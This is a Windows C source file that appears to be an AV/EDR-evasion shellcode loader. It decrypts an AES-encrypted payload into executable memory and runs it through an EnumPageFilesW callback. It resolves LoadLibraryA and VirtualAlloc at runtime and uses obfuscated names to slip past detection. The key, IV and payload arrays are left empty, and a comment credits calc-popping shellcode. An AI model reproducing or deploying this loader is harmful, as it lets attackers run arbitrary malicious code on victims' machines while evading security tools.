
#include <windows.h>
#include <stdio.h>
#include <psapi.h>

// alfarom256 calc shellcode
unsigned char ke185hams[] = {};
unsigned char AESiv[] = {};
    
unsigned char itsthecod345[] = {};
    
void aesdecrypt(char* data, DWORD dataLen, char* key, DWORD keyLen, char* iv, DWORD ivLen) {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)key, keyLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv, 0);
    CryptDecrypt(hKey, 0, FALSE, 0, (BYTE*)data, &dataLen);

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}

typedef HMODULE(WINAPI* tlloadlibraryA)(LPCSTR);

HMODULE coolloadliba(LPCSTR lpLibFileName){

    HMODULE hModule = NULL;
    HMODULE kern332= GetModuleHandleA("kernel32.dll");
    if(kern332){
       tlloadlibraryA ploadliba = (tlloadlibraryA)GetProcAddress(kern332,"LoadLibraryA");
       if(ploadliba){
          hModule = ploadliba(lpLibFileName);
       }
      }
     return hModule;
   }



int main() {

    HMODULE ker32=coolloadliba("kernel32.dll");
    
    LPVOID (*pvirtualalloc)(LPVOID,SIZE_T,DWORD, DWORD)=(LPVOID(*)(LPVOID , SIZE_T,DWORD, DWORD))GetProcAddress(ker32, "VirtualAlloc");
    
    LPVOID addr = pvirtualalloc(NULL, sizeof(itsthecod345), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    aesdecrypt((char*)itsthecod345, sizeof(itsthecod345), (char*)ke185hams, sizeof(ke185hams), (char*)AESiv, sizeof(AESiv));
        
    RtlMoveMemory(addr, itsthecod345, sizeof(itsthecod345));

    ::EnumPageFilesW((PENUM_PAGE_FILE_CALLBACKW)addr, NULL);
}
